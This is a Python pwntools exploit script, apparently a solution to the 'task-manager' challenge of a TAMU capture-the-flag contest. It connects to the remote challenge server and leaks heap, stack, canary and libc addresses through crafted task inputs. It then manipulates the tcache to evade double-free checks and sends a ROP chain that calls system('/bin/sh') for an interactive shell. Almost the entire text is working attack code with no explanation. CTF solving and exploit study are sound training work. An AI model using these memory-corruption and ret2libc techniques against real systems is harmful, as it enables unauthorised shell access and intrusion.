from pwn import *

binary = './task-manager'
elf = context.binary = ELF(binary)
libc = ELF('./libc.so.6')

context.log_level = 'debug'

p = remote("streams.tamuctf.com", 443, ssl=True, sni="task-manager")
#p = process(binary)

def add_task(task):
    p.recvuntil(b"your input:")
    p.sendline(b"1")
    p.recvuntil(b"Enter task")
    p.send(task)

def delete_task():
    p.recvuntil(b"your input:")
    p.sendline(b"3")

def exit_task():
    p.recvuntil(b"your input:")
    p.sendline(b"5")


# Entering name
p.recvuntil(b"40 characters")
p.send(cyclic(0x8)+b"\xe0")

p.recvuntil(b"Welcome, ")


# Heap leak
payload = cyclic(80)
add_task(payload)
p.recvuntil(cyclic(80))

heap_leak = int.from_bytes(p.recvline()[:-1], 'little')

print("Heap leak: ", hex(heap_leak))

# Preparing stack leak
payload = cyclic(80) + p64(heap_leak-0xc0)
add_task(payload[:-1])

# Stack leak
add_task(cyclic(8))
p.recvuntil(cyclic(8))
stack_leak = int.from_bytes(p.recvline()[:-1], 'little')

print("Stack leak: ", hex(stack_leak))

pointer = stack_leak+0x88
print("Address we will use for stack: ", hex(pointer))


# Preparing Canary Leak:
payload = cyclic(80) + p64(pointer)
add_task(payload)

# Canary Leak:
payload = cyclic(0x19)
add_task(payload)

p.recvuntil(cyclic(0x19))
canary = p.recvline()[:7]
print("Canary: ", canary)

# Delete task to read to tcache:
delete_task()


# LIBC leak
payload = cyclic(0x28)
add_task(payload)

p.recvuntil(cyclic(0x28))
libc_leak = int.from_bytes(p.recvline()[:6], 'little')

print("LIBC leak: ", hex(libc_leak))
libc.address = libc_leak-(0xc24a-0xb000)-0x26000

print("LIBC base: ", hex(libc.address))

# Delete task to read to tcache:
delete_task()


# Fill up tcache so double free is not detected
for i in range(10):
    add_task(b"A")

for i in range(10):
    delete_task()



# ROP chain
payload = cyclic(0x18)+b"\x00"+canary+cyclic(0x8)

# 0x00000000000277e5 : pop rdi ; ret
# 0x0000000000026e99 : ret
binsh = next(libc.search(b"/bin/sh\x00"))
rop = p64(libc.address+0x277e5) + p64(binsh)
rop += p64(libc.address+0x26e99)
rop += p64(libc.sym['system'])

payload += rop
add_task(payload)

print("Type <ENTER> to continue:")
input()
exit_task()

p.interactive()



